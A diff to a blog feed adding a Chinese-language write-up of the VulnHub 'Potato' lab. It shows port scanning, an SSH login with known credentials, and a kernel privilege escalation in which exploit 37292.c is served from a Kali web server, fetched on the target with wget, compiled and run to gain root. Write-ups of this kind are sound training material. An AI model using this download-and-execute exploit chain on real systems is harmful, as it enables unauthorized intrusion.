@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>vulnhub-potato(SunCSR)</title>
+      <link href="/2020/11/21/vulnhub-potato-SunCSR/"/>
+      <url>/2020/11/21/vulnhub-potato-SunCSR/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描一波，找到靶机的IP，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/1.png" alt><br>直接IP打开80端口页面，发现除了一张土豆照片之外什么也没有，所以觉得可能会有其他端口开启了但没有被扫描到，所以，利用nmap再扫描一次，看到了开起了7120端口，而且利用了TCP协议，我在看了别人的wp之后了解到靶机将ssh服务转接到了7120端口。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/2.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>所以我尝试连接一下发现了确实是一个ssh端口，但是我没有登录的账号密码，所以只能利用被人的wp，得到账号为potato，密码为letmein（主要是我的九头蛇出问题了，还有就是没有字典），登录上之后，我们相当于一个游客的权限。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/3.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>在登陆上之候，sudo一下发现并没有文件我们是可以以root权限执行的，所以就只能从系统漏洞着手了，发现这是一个版本为3.13.0的Ubuntu。（很老的版本了）<br><img src="/2020/11/21/vulnhub-potato-SunCSR/7.png" alt><br>在kali中寻找一下该系统的exp，将37292.c保存到/var/www/html目录下，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/4.png" alt><br>然后开启web服务。</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer  //kali开启web服务wget http://192.168.10.207:8000/wdnmd.c  //靶机下载exp</code></pre><p><img src="/2020/11/21/vulnhub-potato-SunCSR/5.png" alt><br>靶机从kali上下载exp，将39272利用gcc命令转变一下文件格式，从c文件转换为文件，（我背这一步卡了好长时间，最后看了c文件中给的提示才知道怎么操作）然后执行，拿到了root权限，拿到了flag。</p><pre class=" language-shell"><code class="language-shell">gcc wdnmd.c -o wdnmd    /文件格式转换./wdnmd            /执行文件，提权</code></pre><p><img src="/2020/11/21/vulnhub-potato-SunCSR/6.png" alt></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulnhub-DC8</title>
       <link href="/2020/11/17/vulnhub-DC8/"/>
       <url>/2020/11/17/vulnhub-DC8/</url>
